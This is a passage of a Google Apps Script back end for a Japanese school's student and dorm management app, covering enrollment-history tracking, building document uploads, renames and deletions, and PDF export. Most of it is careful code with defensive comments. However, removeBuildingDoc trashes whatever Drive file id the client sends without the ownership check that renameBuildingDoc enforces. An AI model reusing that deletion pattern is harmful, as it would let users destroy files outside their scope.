                     "）: " + unaccounted.slice(0, ENROL_LOG_MAX_IDS).join(","));
        try {
          console.warn("Enrollment snapshot held for " + ym + ": " + unaccounted.length +
                       " of " + base.length + " students missing with no 修了 record.");
        } catch (e2) {}
        return { recorded: false, month: ym, reason: "drop gate",
                 held: unaccounted.length, departed: departed };
      }
    }

    const rows = _enrolBucketsFor_(ym, data, new Date());

    // ⚠️ Bottom-up, like every other delete loop here: deleteRow(N) shifts later
    // rows up, and a top-down pass skips whatever moved into the gap (§8.3).
    for (let k = mine.length - 1; k >= 0; k--) sh.deleteRow(mine[k]);

    // ⚠️ ONE setValues, never appendRow in a loop. 60-80 rows at one Sheets call
    // each is the same shape of mistake that made the session prune a potential
    // failed login — slow work on a path nobody is watching.
    sh.getRange(sh.getLastRow() + 1, 1, rows.length, ENROL_HISTORY_HEADERS.length)
      .setValues(rows.map(_cellSafeRow_));

    // ⚠️ AFTER the counts, and only on this path — a held run must leave the
    // previous roster untouched, which is what keeps its baseline good.
    _writeEnrolRoster_(ym, todayIds);

    // ⚠️ The departed/unaccounted split goes in the log line rather than into
    // Activity_Log: it is tuning data for ENROL_DROP_MIN and the two ratios, and a
    // nightly audit row on every clean run is how an audit trail stops being read.
    try {
      console.info("Enrollment snapshot refreshed for " + ym + " (" + rows.length +
                   " rows, " + todayIds.length + " students; " + departed + " left, " +
                   (departed - unaccounted.length) + " with a 修了 record).");
    } catch (e) {}
    return { recorded: true, month: ym, rows: rows.length, roster: todayIds.length,
             departed: departed, unaccounted: unaccounted.length };
  } catch (e) {
    // Never let housekeeping break the sync it rides on.
    try { console.warn("Enrollment snapshot failed: " + e.message); } catch (e2) {}
    return { recorded: false, error: String(e && e.message || e) };
  }
}

// ⚠️ EVERY return path of _recordEnrollmentReturns_ goes through here. It used to
// log nothing at all on any successful path, so "roster gap", "already corrected",
// "nothing to report" and "flagged it" were the same blank Execution log — and a
// staging test burned an afternoon on exactly that ambiguity. Same lesson as the
// dorm report's: record the RUN, not only the exceptions.
function _enrolReturnLog_(msg) {
  try { console.info("Enrollment return check " + msg + "."); } catch (e) {}
}

// Spot the students who left and came straight back — the fingerprint of a row
// deleted from the source by accident and re-entered, rather than of anyone
// actually leaving.
//
//   復帰(M) = roster(M) ∩ roster(M-2) \ roster(M-1)
//
// present two months ago, missing last month, back this month. A real departure
// does not do that, and a real re-enrolment almost never does it inside one month.
// The month it accuses is M-1, whose 合計 is short by that many.
//
// ⚠️ A SEPARATE function from _recordEnrollmentSnapshot_, called after it. The
// snapshot returns early on a 手動 month and must keep doing so — but a month whose
// counts were typed still deserves its predecessor checked.
//
// ⚠️ It records the observation and stops there. Rewriting 合計(M-1) automatically
// is the one thing this whole area exists to prevent: that figure is a reported
// number, and a nightly job that edits reported numbers is worse than the bug it
// would be fixing. Correcting it is 増減推移's 手動 entry, by someone who has looked
// at what actually happened.
//
// ⚠️ It is the OTHER HALF of the gate above, not a nicety. The gate cannot catch a
// deletion made on the 1st of a month: the baseline is then last month's roster,
// the loose cross-month ratio lets it through, and every later night compares
// against the already-bad roster. This is what finds that one, a month later.
function _recordEnrollmentReturns_() {
  try {
    const m0 = _ymKey_(new Date());
    const m1 = _ymAdd_(m0, -1), m2 = _ymAdd_(m0, -2);
    const r0 = _readEnrolRoster_(m0), r1 = _readEnrolRoster_(m1), r2 = _readEnrolRoster_(m2);
    // All three months must have been measured. Across a gap the middle month was
    // never recorded, so there is nothing to accuse and no basis to accuse it on.
    if (!r0.length || !r1.length || !r2.length) {
      // ⚠️ The three lengths, not just the word "gap". Which month is missing is
      // the entire diagnosis, and without it this branch is indistinguishable from
      // the three below — all four used to return in silence.
      _enrolReturnLog_("skipped for " + m1 + ": roster gap (" + m2 + ":" + r2.length +
                      ", " + m1 + ":" + r1.length + ", " + m0 + ":" + r0.length + ")");
      return { flagged: false, reason: "roster gap" };
    }

    let inM1 = {}, inM2 = {};
    r1.forEach(function (id) { inM1[id] = true; });
    r2.forEach(function (id) { inM2[id] = true; });
    const returned = r0.filter(function (id) { return !inM1[id] && inM2[id]; });

    const sh = _getEnrolHistorySheet_();
    const data = sh.getDataRange().getDisplayValues();

    // ⚠️ Leave a month somebody has already corrected alone. Re-flagging a figure
    // that has been dealt with is how a warning becomes wallpaper — and the 手動
    // mark is exactly what "dealt with" looks like here.
    let manual = false, mine = [];
    for (let i = 1; i < data.length; i++) {
      if (String(data[i][0] || "").trim() !== m1) continue;
      if (String(data[i][5] || "").trim() === ENROL_MANUAL) manual = true;
      if (String(data[i][1] || "").trim() === ENROL_RETURN_KIND) mine.push(i + 1);
    }
    if (manual) {
      _enrolReturnLog_("skipped for " + m1 + ": hand-entered figures present");
      return { flagged: false, month: m1, reason: "manual entry present" };
    }

    // Drop any earlier verdict first: this runs nightly and the count moves as more
    // students come back. Bottom-up (§8.3).
    for (let k = mine.length - 1; k >= 0; k--) sh.deleteRow(mine[k]);

    if (returned.length < ENROL_RETURN_MIN) {
      _enrolReturnLog_(m1 + ": " + returned.length + " returned, under the threshold of " +
                      ENROL_RETURN_MIN + " (rosters " + r2.length + "/" + r1.length +
                      "/" + r0.length + ")");
      return { flagged: false, month: m1, returned: returned.length };
    }

    const row = _cellSafeRow_([m1, ENROL_RETURN_KIND, m0, returned.length, new Date(), ENROL_AUTO]);
    sh.getRange(sh.getLastRow() + 1, 1, 1, ENROL_HISTORY_HEADERS.length).setValues([row]);
    _logActivity_({ role: "master", name: "システム", id: "SYSTEM" },
                 "在籍者数の記録漏れの可能性を検出", SHEET_ENROL_HISTORY,
                 m1 + " / " + returned.length + "名が " + m0 + " に復帰: " +
                 returned.slice(0, ENROL_LOG_MAX_IDS).join(","));
    _enrolReturnLog_("flagged " + m1 + ": " + returned.length + " students returned in " + m0);
    return { flagged: true, month: m1, returned: returned.length };
  } catch (e) {
    // Same contract as the snapshot: housekeeping never breaks the sync it rides on.
    try { console.warn("Enrollment return check failed: " + e.message); } catch (e2) {}
    return { flagged: false, error: String((e && e.message) || e) };
  }
}

// Reconstruct the JOINS side for months before recording began, from the
// 学籍番号 intake prefix.
//
// ⚠️ Joins only, and the reader must say so. Departures are genuinely
// unrecoverable — see the warning at the top of this section — so a backfilled
// month has a real 増 and an unknown 減. Presenting a blank 減 as zero would
// invent a fact.
//
// Also: 在籍数 for a past month is reconstructed as "students whose intake was
// that month or earlier, who are STILL enrolled today" — it is a lower bound on
// the true headcount, because everyone who has since left is missing from it.
function backfillEnrollmentHistory() {
  _requireMaintenanceUnlock_("backfillEnrollmentHistory");
  const sh = _getEnrolHistorySheet_();
  const data = _readTabs_(["Central_DB"])["Central_DB"] || [];
  if (data.length < 2) return "Central_DB が空です。";

  const headers = data[0];
  const iId = headers.indexOf("学籍番号");
  if (iId === -1) return "学籍番号 列が見つかりません。";

  const existing = sh.getDataRange().getDisplayValues();
  let have = {};
  for (let i = 1; i < existing.length; i++) {
    if (String(existing[i][1]).trim() === "合計") have[String(existing[i][0]).trim()] = true;
  }

  // intake month -> how many of today's students joined then
  let joins = {};
  for (let i = 1; i < data.length; i++) {
    const k = _intakeKeyFromStudentId_(data[i][iId]);
    if (k) joins[k] = (joins[k] || 0) + 1;
  }
  const months = Object.keys(joins).sort();
  if (!months.length) return "学籍番号から入学月を判定できませんでした。";

  const thisMonth = _ymKey_(new Date());
  const stamp = new Date();
  let rows = [], running = 0, added = 0;
  months.forEach(function (m) {
    running += joins[m];                       // cumulative survivors, a lower bound
    if (m >= thisMonth || have[m]) return;     // never overwrite a real measurement
    rows.push([m, "合計", "", running, stamp, ENROL_AUTO]);
    rows.push([m, "入学期", m, joins[m], stamp, ENROL_AUTO]);
    added++;
  });
  if (!rows.length) return "追加する月はありませんでした。";

  sh.getRange(sh.getLastRow() + 1, 1, rows.length, ENROL_HISTORY_HEADERS.length)
    .setValues(rows.map(_cellSafeRow_));
  return added + "か月分を補完しました（入学者数のみ。退学・卒業は記録開始前のため不明）。";
}

// The 増減推移 table. 減 is ARITHMETIC, not a measurement:
//
//   減(M) = 在籍数(M-1) + 増(M) − 在籍数(M)
//
// which is exact given the two headcounts and the joins, and needs no departure
// dates. ⚠️ Its blind spot: a student who joins AND leaves inside the same month
// cancels out and is invisible. The client says so rather than implying the
// numbers are exhaustive.
function getEnrollmentHistory(role, perms) {
  if (!_permOrLegacyRole_(role, perms, "view_students", ["sales"])) throw new Error("権限がありません");

  // ⚠️ canEdit describes the CALLER and must not depend on the sheet existing.
  // It used to be hardcoded false on the missing-sheet path, which made a perfect
  // deadlock: Enrollment_History is created by the first write, so on a project
  // where the trigger has never run there was no history because there was
  // nowhere to type it, and nowhere to type it because there was no history.
  //
  // ⚠️ THE SAME EXPRESSION saveEnrollmentMonths guards on. A UI stricter than the
  // server hides a legal action; a UI looser offers one the server will refuse.
  // It was _isAdminLevel_, which tied this to admin level rather than something the
  // master could grant per user.
  const canEdit = _hasPerm_(role, perms, "edit_enrollment");
  // Asia/Tokyo, so which 年度 counts as current is the school's clock and not the
  // viewer's — the client was falling back to the browser's date.
  const today = _ymKey_(new Date());

  const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_ENROL_HISTORY);
  if (!sh) return { rows: [], canEdit: canEdit, today: today };
  const data = sh.getDataRange().getDisplayValues();

  let totals = {}, joins = {}, intakeJoins = {}, stamps = {}, entered = {}, returned = {};
  for (let i = 1; i < data.length; i++) {
    const ym = String(data[i][0] || "").trim();
    const kind = String(data[i][1] || "").trim();
    const val = String(data[i][2] || "").trim();
    const n = parseInt(data[i][3], 10);
    if (!ym || isNaN(n)) continue;
    // ⚠️ Blank 入力種別 is 自動 — every row predating that column was measured.
    const manual = String(data[i][5] || "").trim() === ENROL_MANUAL;
    if (kind === "合計") {
      totals[ym] = n; stamps[ym] = String(data[i][4] || "");
      if (manual) entered[ym] = true;
    } else if (kind === "入") {
      joins[ym] = n;                      // hand-entered joiners win
    } else if (kind === "入学期" && val === ym) {
      intakeJoins[ym] = n;                // the measured fallback
    } else if (kind === ENROL_RETURN_KIND) {
      // ⚠️ Written ONTO the suspect month by _recordEnrollmentReturns_: this many
      // of that month's students were absent for it and back the month after, so
      // its 合計 is probably short. 値 holds the month they came back in.
      returned[ym] = n;
    }
  }

  const months = Object.keys(totals).sort();
  let out = [];
  months.forEach(function (m, i) {
    const prev = i > 0 ? totals[months[i - 1]] : null;
    const j = (joins[m] !== undefined) ? joins[m] : (intakeJoins[m] || 0);
    // ⚠️ No previous month means 出 is UNKNOWN, not zero. Reporting 0 would read
    // as "nobody left", which is a claim the data cannot make. Same for 前月差.
    //
    // ⚠️ And "previous" means the previous month IN THE SERIES. A gap in the
    // record makes this the difference across that gap, not one month's churn —
    // the client marks a month whose predecessor is missing.
    const contiguous = (prev !== null) && _isPrevMonth_(months[i - 1], m);
    const left = contiguous ? (prev + j - totals[m]) : null;
    out.push({
      month: m, total: totals[m], joined: j, left: left,
      net: contiguous ? (totals[m] - prev) : null,
      entered: !!entered[m], at: stamps[m] || "",
      // Advisory only. Nothing in the client reads it yet; without it the 復帰
      // rows would be write-only and the detection would exist nowhere a screen
      // can reach.
      returned: returned[m] || 0
    });
  });
  return { rows: out, canEdit: canEdit, today: today };
}

// Is `b` the calendar month immediately after `a`? Both "YYYY-MM".
function _isPrevMonth_(a, b) {
  if (!a || !b) return false;
  const pa = a.split("-"), pb = b.split("-");
  const ma = parseInt(pa[0], 10) * 12 + parseInt(pa[1], 10);
  const mb = parseInt(pb[0], 10) * 12 + parseInt(pb[1], 10);
  return mb - ma === 1;
}

// Hand-entered months, for the years the app was not yet recording. Writes the
// 合計 and 入 rows for each month and marks them 手動, which is what stops the
// nightly snapshot from overwriting them.
//
// ⚠️ Guarded by the edit_enrollment PERMISSION, not by admin level. It began as
// _isAdminLevel_ on the reasoning that rewriting a reported figure is an admin
// operation — but that made it ungrantable, and the master needed it delegable.
// _hasPerm_ short-circuits true for master, so the master never needs the tick.
//
// getEnrollmentHistory's canEdit must stay the same expression: the two decide
// whether the same button appears and whether pressing it works.
function saveEnrollmentMonths(role, perms, months, actorName, actorId) {
  if (!_hasPerm_(role, perms, "edit_enrollment")) throw new Error("権限がありません");
  if (!months || !months.length) return { saved: 0 };

  const sh = _getEnrolHistorySheet_();
  _snapshotSheet_(SHEET_ENROL_HISTORY);
  const data = sh.getDataRange().getDisplayValues();
  const stamp = new Date();

  // Normalise and validate first, so a bad payload cannot half-apply.
  let want = {};
  months.forEach(function (m) {
    const ym = String(m && m.month || "").trim();
    if (!/^\d{4}-\d{2}$/.test(ym)) throw new Error("年月の形式が不正です: " + ym);
    const t = (m.total === "" || m.total === null || m.total === undefined) ? null : parseInt(m.total, 10);
    const j = (m.joined === "" || m.joined === null || m.joined === undefined) ? null : parseInt(m.joined, 10);
    if (t !== null && (isNaN(t) || t < 0)) throw new Error("在籍者数が不正です: " + ym);
    if (j !== null && (isNaN(j) || j < 0)) throw new Error("入学者数が不正です: " + ym);
    want[ym] = { total: t, joined: j };
  });

  // Drop the existing 合計 / 入 rows for those months, bottom-up (§8.3).
  let drop = [];
  for (let i = 1; i < data.length; i++) {
    const ym = String(data[i][0] || "").trim();
    const kind = String(data[i][1] || "").trim();
    // ⚠️ 復帰 goes too. A hand-corrected month has been dealt with, and the row
    // that accused it must not outlive the correction — _recordEnrollmentReturns_
    // then declines to re-add it because the month is now 手動.
    if (want[ym] && (kind === "合計" || kind === "入" || kind === ENROL_RETURN_KIND)) drop.push(i + 1);
  }
  for (let k = drop.length - 1; k >= 0; k--) sh.deleteRow(drop[k]);

  let rows = [];
  Object.keys(want).sort().forEach(function (ym) {
    const w = want[ym];
    // A cleared cell removes the month rather than storing a zero — blank means
    // "no figure", and 0 would be a claim that the school had no students.
    if (w.total !== null) rows.push([ym, "合計", "", w.total, stamp, ENROL_MANUAL]);
    if (w.joined !== null) rows.push([ym, "入", "", w.joined, stamp, ENROL_MANUAL]);
  });
  if (rows.length) {
    sh.getRange(sh.getLastRow() + 1, 1, rows.length, ENROL_HISTORY_HEADERS.length)
      .setValues(rows.map(_cellSafeRow_));
  }
  _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
               "在籍者数を手動入力", Object.keys(want).sort().join(", "), rows.length + "行");
  return { saved: Object.keys(want).length };
}

function _getGeneralDocsSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_GENERAL_DOCS);
  if (!sh) {
    sh = ss.insertSheet(SHEET_GENERAL_DOCS);
    sh.appendRow(["書類ID（カンマ区切り）"]);
    sh.setFrozenRows(1);
  }
  // One data row, always row 2. appendRow on a fresh sheet leaves only the header.
  if (sh.getLastRow() < 2) sh.appendRow([""]);
  return sh;
}

// The single place the four 別紙 functions resolve where their id list lives.
// Returns the sheet, the row, THE COLUMN, and the current ids.
//
// ⚠️ `col` is why this is worth reading. Building rows keep their list in column 45;
// the general sheet keeps it in column 1. Callers must use info.col — a literal 45
// would write general ids into Building_Info, or building ids into column 1.
function _getBuildingDocRow_(buildingId) {
  // ⚠️ Sentinel first, before any Building_Info scan, so a building could never
  // shadow it. Ids look like "B01"; the double-underscore form cannot collide by
  // accident, and this ordering settles it if one ever did.
  if (String(buildingId).trim() === GENERAL_DOC_ID) {
    const gs = _getGeneralDocsSheet_();
    let ids = String(gs.getRange(2, 1).getValue() || "").split(",").map(function(s){ return s.trim(); }).filter(function(s){ return s !== ""; });
    return { sheet: gs, rowIndex: 2, col: 1, ids: ids };
  }
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_BUILDING);
  const data = sheet.getDataRange().getValues();
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === String(buildingId).trim()) {
      let ids = String(data[i][44] || "").split(",").map(function(s){ return s.trim(); }).filter(function(s){ return s !== ""; });
      return { sheet: sheet, rowIndex: i + 1, col: 45, ids: ids };
    }
  }
  return null;
}
// Dashboard data: every building with its attached documents. Readable by any
// dorm viewer. Returns [{ id, nameEn, nameJp, docs: [{id,name,url}] }].
function getAllBuildingDocs(userRole, userPerms) {
  if (!_hasPerm_(userRole, userPerms, "view_dorms")) {
    throw new Error("権限がありません");
  }
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_BUILDING);
  if (!sheet) return [];
  const data = sheet.getDataRange().getValues();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    let bid = String(data[i][0] || "").trim();
    if (bid === "") continue;
    let ids = String(data[i][44] || "").split(",").map(function(s){ return s.trim(); }).filter(function(s){ return s !== ""; });
    let docs = [];
    ids.forEach(function(id){
      try {
        let f = DriveApp.getFileById(id);
        docs.push({ id: id, name: f.getName(), url: f.getUrl() });
      } catch (e) { /* skip missing */ }
    });
    out.push({ id: bid, nameEn: data[i][1] || "", nameJp: data[i][2] || "", docs: docs });
  }

  // The building-less store, shaped exactly like a building so the client can
  // flatten it with everything else. It has no name — the list renders 「—」 for it.
  try {
    const gs = _getGeneralDocsSheet_();
    let gids = String(gs.getRange(2, 1).getValue() || "").split(",").map(function(s){ return s.trim(); }).filter(function(s){ return s !== ""; });
    let gdocs = [];
    gids.forEach(function(id){
      try {
        let f = DriveApp.getFileById(id);
        gdocs.push({ id: id, name: f.getName(), url: f.getUrl() });
      } catch (e) { /* skip missing, same as buildings */ }
    });
    out.push({ id: GENERAL_DOC_ID, nameEn: "", nameJp: "", docs: gdocs });
  } catch (e) { /* the sheet is created on demand; a failure here must not blank the list */ }

  return out;
}

function uploadBuildingDoc(buildingId, fileObj, userRole, userPerms, actorName, actorId) {
  if (!_hasPerm_(userRole, userPerms, "edit_dorms")) {
    throw new Error("権限がありません");
  }
  if (!fileObj || !fileObj.base64) throw new Error("ファイルがありません。");
  const info = _getBuildingDocRow_(buildingId);
  if (!info) throw new Error("建物が見つかりません。");
  if (info.ids.length >= MAX_BUILDING_DOCS) {
    throw new Error("添付できる書類は最大 " + MAX_BUILDING_DOCS + " 件までです。");
  }

  const folder = DriveApp.getFolderById(_requireConfig_(CONFIG_UPLOADS_FOLDER));   // same folder as booking attachments
  const bytes = Utilities.base64Decode(fileObj.base64);
  const safeName = String(fileObj.name || "document").replace(/[\/\\]/g, "_");
  const blob = Utilities.newBlob(bytes, fileObj.mimeType || "application/octet-stream", buildingId + "_doc_" + new Date().getTime() + "_" + safeName);
  const file = folder.createFile(blob);

  info.ids.push(file.getId());
  info.sheet.getRange(info.rowIndex, info.col).setValue(info.ids.join(","));
  try { _logActivity_({ role: userRole, name: actorName || "", id: actorId || "" }, "建物書類を追加", buildingId + ": " + safeName, ""); } catch (e) {}
  return { id: file.getId(), name: file.getName(), url: file.getUrl(), count: info.ids.length };
}

// Rename one 別紙. Drive only — the sheet is untouched, because the id list in
// Building_Info col 45 does not change.
//
// ⚠️ The {buildingId}_doc_{timestamp}_ prefix is PRESERVED. Every 別紙 in the app
// lives in one shared Drive folder, and that prefix is the only thing tying a file
// there back to a building. Only the part after it is replaced, so the list shows
// what the user typed while Drive keeps its traceability.
//
// ⚠️ No _snapshotSheet_: nothing in a sheet changes. It is deliberately absent from
// the destructive-action list in tests/damagecontrol.test.js for that reason.
function renameBuildingDoc(buildingId, fileId, newName, userRole, userPerms, actorName, actorId) {
  if (!_hasPerm_(userRole, userPerms, "edit_dorms")) {
    throw new Error("権限がありません");
  }
  const clean = String(newName || "").replace(/[\/\\]/g, "_").trim();
  if (clean === "") throw new Error("ファイル名を入力してください。");

  const info = _getBuildingDocRow_(buildingId);
  if (!info) throw new Error("建物が見つかりません。");

  // ⚠️ THE check. fileId arrives from the client; without this the endpoint renames
  // any Drive file the deploying account owns, given only its id.
  if (info.ids.indexOf(String(fileId).trim()) === -1) {
    throw new Error("この建物の別紙ではありません。");
  }

  let file;
  try { file = DriveApp.getFileById(fileId); }
  catch (e) { throw new Error("ファイルが見つかりません。"); }

  const old = file.getName();
  const m = old.match(/^(.*?_doc_\d+_)/);
  const finalName = (m ? m[1] : "") + clean;
  file.setName(finalName);

  try { _logActivity_({ role: userRole, name: actorName || "", id: actorId || "" },
                     "建物書類の名前を変更", buildingId + ": " + old, "→ " + finalName); } catch (e) {}
  return { id: fileId, name: finalName };
}

function removeBuildingDoc(buildingId, fileId, userRole, userPerms, actorName, actorId) {
  if (!_hasPerm_(userRole, userPerms, "edit_dorms")) {
    throw new Error("権限がありません");
  }
  const info = _getBuildingDocRow_(buildingId);
  if (!info) throw new Error("建物が見つかりません。");
  let newIds = info.ids.filter(function(id){ return id !== fileId; });
  // ⚠️ What is lost is one id from the list; the file itself goes to Drive's trash, which
  // keeps it 30 days. The id is logged so the file can be found there and put back.
  info.sheet.getRange(info.rowIndex, info.col).setValue(newIds.join(","));
  try { DriveApp.getFileById(fileId).setTrashed(true); } catch (e) { /* already gone */ }
  try { _logActivity_({ role: userRole, name: actorName || "", id: actorId || "" }, "建物書類を削除", buildingId, "fileId=" + fileId); } catch (e) {}
  return { count: newIds.length };
}

function _getBuildingDataForPdf_(buildingId) {
  const bldgSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_BUILDING);
  const bldgData = bldgSheet.getDataRange().getValues();
  let matchedBuilding = {};
  for (let i = 1; i < bldgData.length; i++) {
    if (String(bldgData[i][0]).trim() === String(buildingId).trim()) {
      matchedBuilding = {
        bldgNameEn: bldgData[i][1], bldgNameJp: bldgData[i][2], addressEn: bldgData[i][3], addressJp: bldgData[i][4],
        garbageHousehold: bldgData[i][5], garbageCans: bldgData[i][6], garbagePlastic: bldgData[i][7],
        washingMachine: "", routeUrl1: bldgData[i][9], routeUrl2: bldgData[i][10], 
        garbagePlaceInfo: bldgData[i][11], remarks: bldgData[i][12], waterBill: bldgData[i][13], 
        elecBill: bldgData[i][14], gasBill: bldgData[i][15], internetBill: bldgData[i][16],
        autoLock: bldgData[i][17], garbageHouseholdBag: bldgData[i][18], garbageCansBag: bldgData[i][19], garbagePlasticBag: bldgData[i][20],
        wm1Id: bldgData[i][21], wm2Id: bldgData[i][22], wm3Id: bldgData[i][23],
        garbage1Id: bldgData[i][24], garbage2Id: bldgData[i][25], garbage3Id: bldgData[i][26],
        garbagePaper: bldgData[i][27], garbagePaperBag: bldgData[i][28],
        bicycle1Id: bldgData[i][29], bicycle2Id: bldgData[i][30], bicycle3Id: bldgData[i][31],
        exteriorId: bldgData[i][32],
        exteriorCaption: bldgData[i][33], wm1Caption: bldgData[i][34], wm2Caption: bldgData[i][35], wm3Caption: bldgData[i][36],
        garbage1Caption: bldgData[i][37], garbage2Caption: bldgData[i][38], garbage3Caption: bldgData[i][39],
        bicycle1Caption: bldgData[i][40], bicycle2Caption: bldgData[i][41], bicycle3Caption: bldgData[i][42],
        otherBill: bldgData[i][43] || "",
        hotWaterBill: bldgData[i][45] || "",   // 給湯代 (building default)
        rentDefault: bldgData[i][46] || "",    // 家賃 building-level default
        // Blank on any building saved before this column existed, which is
        // exactly what hides the row on the PDF.
        garbageBurnablePlastic: bldgData[i][47] || "",      // 燃えるゴミ(プラスチックを含む)
        garbageBurnablePlasticBag: bldgData[i][48] || "",
        docIds: bldgData[i][44] || ""   // comma-separated Drive file IDs of attached documents
      };
      break;
    }
  }
  return matchedBuilding;
}

// --- BULK PDF EXPORT (one combined file per building) ---
// Step 1: list the rooms in a building (frontend uses this to drive batching).
function getBuildingRoomsForExport(userRole, buildingId, perms) {
  if (!_permOrLegacyRole_(userRole, perms, "export_dorms", ["sales"])) throw new Error("権限がありません");
  const roomSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_ROOM);
  const data = roomSheet.getDataRange().getValues();
  let rooms = [];
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][1]).trim() === String(buildingId).trim()) {
      rooms.push({
        rowIndex: i + 1,
        building: data[i][1],
        roomNumber: data[i][2],
        rentPrice: String(data[i][3] == null ? "" : data[i][3]).replace(/,/g, ''),
        mailboxCode: data[i][4], deliveryBoxCode: data[i][5], wifiInfo: data[i][6],
        status: data[i][7] || "空室", bicycleNumber: data[i][8] || "",
        studentId: data[i][9] || "", studentName: data[i][10] || "",
        nationality: data[i][11] || "", studentClass: data[i][12] || "",
        roomCode: data[i][13] || "", remarks: data[i][14] || "",
        // Per-room bill overrides (cols 16-21 / idx 15-20), mirroring getDormData.
        // _buildRoomHtml_ resolves each utility as pick(override, buildingDefault),
        // so omitting these silently printed the BUILDING default on every
        // bulk-exported room that had an override — wrong figures, no error.
        waterBillOverride: data[i][15] || "",
        elecBillOverride: data[i][16] || "",
        gasBillOverride: data[i][17] || "",
        internetBillOverride: data[i][18] || "",
        otherBillOverride: data[i][19] || "",
        hotWaterBillOverride: data[i][20] || ""
      });
    }
  }
  rooms.sort((a, b) => String(a.roomNumber).localeCompare(String(b.roomNumber), undefined, { numeric: true }));
  return rooms;
}

// Step 2: build HTML for a batch of rooms (returns array of HTML fragments).
// Called repeatedly by the frontend with small slices to avoid timeouts.
function buildRoomHtmlBatch(userRole, buildingId, roomObjects, perms) {
  if (!_permOrLegacyRole_(userRole, perms, "export_dorms", ["sales"])) throw new Error("権限がありません");
  const bldg = _getBuildingDataForPdf_(buildingId);
  if (!bldg.bldgNameEn && !bldg.bldgNameJp) throw new Error("建物マスターデータが見つかりません。");
  return (roomObjects || []).map(function(room) {
    return _buildRoomHtml_(room, bldg);
  });
}

// _buildRoomHtml_ returns a COMPLETE html document, so combining rooms means
// taking each one apart rather than nesting them. Regex over HTML is normally a
// bad idea; it is acceptable here only because both the producer and the
// consumer are ours and Template.html's shape is fixed — and both helpers fall
// back safely when the shape is not what they expect.
function _htmlHeadInner_(doc) {
  const m = String(doc).match(/<head[^>]*>([\s\S]*?)<\/head>/i);
  return m ? m[1] : '';
}

function _htmlBodyInner_(doc) {
  const m = String(doc).match(/<body[^>]*>([\s\S]*?)<\/body>/i);
  return m ? m[1] : String(doc);   // already a fragment — pass it through
}

// Step 3: combine all room HTML fragments into one PDF and return it.
// Each fragment is wrapped so it starts on a new page.
//
// This must produce ONE valid document, not a stack of nested ones. The previous
// version wrapped each complete room document in a <div> inside a fresh
// <html><head>…<body>, which broke the output in two ways:
//
//   * the wrapper had no <!DOCTYPE html>, putting the renderer in QUIRKS MODE,
//     where a font-size set on body does NOT inherit into <table> elements —
//     they fall back to the default ~16px. Template.html is almost entirely
//     tables, so nearly every line came out larger than the single-room export.
//   * nesting <html>/<head>/<body> inside a body is invalid, so those tags were
//     discarded and N copies of the same <style> and <title> ended up scattered
//     through the document.
//
// Emitting the doctype and the template's <head> exactly once makes the bulk
// output structurally identical to _generatePDF_'s, rather than merely similar.
function combineRoomHtmlToPdf(userRole, buildingId, htmlFragments, perms) {
  if (!_permOrLegacyRole_(userRole, perms, "export_dorms", ["sales"])) throw new Error("権限がありません");
  const bldg = _getBuildingDataForPdf_(buildingId);
  const nameBase = bldg.bldgNameJp || bldg.bldgNameEn || "Dorm";

  const frags = htmlFragments || [];
  // Every fragment carries the same head; take it from the first. If the list is
  // empty or malformed, read the template directly so the styles are never lost.
  let headInner = frags.length ? _htmlHeadInner_(frags[0]) : '';
  if (!headInner) {
    headInner = _htmlHeadInner_(HtmlService.createHtmlOutputFromFile('Template').getContent());
  }

  let combined = '<!DOCTYPE html><html><head>' + headInner + '</head><body>';
  frags.forEach(function(frag, idx) {
    let isLast = (idx === frags.length - 1);
    combined += '<div style="' + (isLast ? '' : 'page-break-after: always;') + '">'
              + _htmlBodyInner_(frag) + '</div>';
  });
  combined += '</body></html>';

  // Same "建物名_部屋番号" shape as the single export, with 全部屋 standing in
  // for the room number.
  const fileName = nameBase + "_全部屋.pdf";
  const blob = Utilities.newBlob(combined, MimeType.HTML).setName(fileName);
  const pdfBlob = blob.getAs(MimeType.PDF);
  return {
    base64: Utilities.base64Encode(pdfBlob.getBytes()),
    fileName: fileName
  };
}

// True only while _buildRoomHtml_ is running. The two helpers below are reachable
// ONLY from there, and both are dangerous if callable directly:
// _getDriveImageBase64_ returns any Drive file the deployer owns, and _getQrBase64_
// makes an outbound fetch with caller-supplied data in the URL.
//
// The leading underscore is the convention for "not an endpoint", but I have not
// verified that google.script.run actually refuses underscore-prefixed names, so
// this flag is the part that is guaranteed to hold. Renaming is hygiene; this is
// the control.
let _renderingRoomHtml = false;

function _getQrBase64_(url) {
  if (!_renderingRoomHtml) throw new Error("内部関数です。");
  if (!url) return "";
  const urlString = String(url).trim();
  if (urlString === "") return "";
  try {
    const apiUrl = "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=" + encodeURIComponent(urlString);
    const blob = UrlFetchApp.fetch(apiUrl).getBlob();
    return "data:image/png;base64," + Utilities.base64Encode(blob.getBytes());
  } catch (error) { return ""; }
}

// ⚠️ Returns ANY Drive file the deployer owns — the bound spreadsheet, a
// SMS_Backups_… snapshot, a hearing sheet — as base64. It was a top-level name
// with no guard at all, which made it an arbitrary-file read that walked straight
// around getUploadedFile's allow-list. See _renderingRoomHtml above.
function _getDriveImageBase64_(fileId) {
  if (!_renderingRoomHtml) throw new Error("内部関数です。");
  if (!fileId) return "";
  try {
    const imgBlob = DriveApp.getFileById(fileId).getBlob();
    return "data:" + imgBlob.getContentType() + ";base64," + Utilities.base64Encode(imgBlob.getBytes());
  } catch (e) { return ""; }
}

function _generatePDF_(roomData, bldgData) {
  const htmlString = _buildRoomHtml_(roomData, bldgData);
  let fileNameBase = bldgData.bldgNameJp || bldgData.bldgNameEn || "Dorm";
  // "建物名_部屋番号.pdf"
  const fileName = fileNameBase + "_" + roomData.roomNumber + ".pdf";
  const blob = Utilities.newBlob(htmlString, MimeType.HTML).setName(fileName);
  const pdfBlob = blob.getAs(MimeType.PDF);
  return {
    base64: Utilities.base64Encode(pdfBlob.getBytes()),
    fileName: fileName
  };
}

